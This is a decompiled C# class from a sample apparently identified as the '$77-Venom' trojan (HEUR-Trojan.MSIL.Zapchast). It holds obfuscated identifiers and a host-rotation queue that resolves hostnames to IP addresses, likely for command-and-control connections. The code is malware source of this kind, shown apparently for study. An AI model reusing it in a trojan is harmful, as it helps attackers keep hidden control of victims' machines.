// Decompiled with JetBrains decompiler
// Type: 捔᷆ཆꫫ嶏ළ咙솼䋧ꖜ芻䆰藻�◴煭槍狫혱
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

public class 捔᷆ཆꫫ嶏\uF040ළ咙솼䋧ꖜ芻䆰藻\uFFFD\u25F4煭槍狫혱
{
  private readonly Queue<톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱> \u2ABD崖衧扇䃬繚䖋먟횥輲纶딖뜕\u2A86怩\uFFFD兘㰭႓闐 = new Queue<톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱>();

  public bool IsEmpty => this.\u2ABD崖衧扇䃬繚䖋먟횥輲纶딖뜕\u2A86怩\uFFFD兘㰭႓闐.Count == 0;

  public 捔᷆ཆꫫ嶏\uF040ළ咙솼䋧ꖜ芻䆰藻\uFFFD\u25F4煭槍狫혱(
    List<톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱> hosts)
  {
    foreach (톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱 host in hosts)
      this.\u2ABD崖衧扇䃬繚䖋먟횥輲纶딖뜕\u2A86怩\uFFFD兘㰭႓闐.Enqueue(host);
  }

  public 톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱 ペ츥ၻ\uFFFD磒㦦\uF48C\uF2AFᰖ탄\u1C8BⲘ틘㨿梕\u251F읃푃㽇햦()
  {
    톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱 host = this.\u2ABD崖衧扇䃬繚䖋먟횥輲纶딖뜕\u2A86怩\uFFFD兘㰭႓闐.Dequeue();
    this.\u2ABD崖衧扇䃬繚䖋먟횥輲纶딖뜕\u2A86怩\uFFFD兘㰭႓闐.Enqueue(host);
    host.IpAddress = 捔᷆ཆꫫ嶏\uF040ළ咙솼䋧ꖜ芻䆰藻\uFFFD\u25F4煭槍狫혱.\uE22D\u276B\uE884矹唨㬱ᤨﰃ\u2499腉辻잪ࢩꦝ꧗\u22D5뱐椬\uE0F4씩(host);
    return host;
  }

  private static IPAddress \uE22D\u276B\uE884矹唨㬱ᤨﰃ\u2499腉辻잪ࢩꦝ꧗\u22D5뱐椬\uE0F4씩(
    톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱 host)
  {
    if (string.IsNullOrEmpty(host.Hostname))
      return (IPAddress) null;
    IPAddress address;
    if (IPAddress.TryParse(host.Hostname, out address))
      return address.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6 ? (IPAddress) null : address;
    IPAddress[] addressList = Dns.GetHostEntry(host.Hostname).AddressList;
    foreach (IPAddress ipAddress in addressList)
    {
      switch (ipAddress.AddressFamily)
      {
        case AddressFamily.InterNetwork:
          return ipAddress;
        case AddressFamily.InterNetworkV6:
          if (addressList.Length == 1)
            return ipAddress;
          break;
      }
    }
    return address;
  }
}
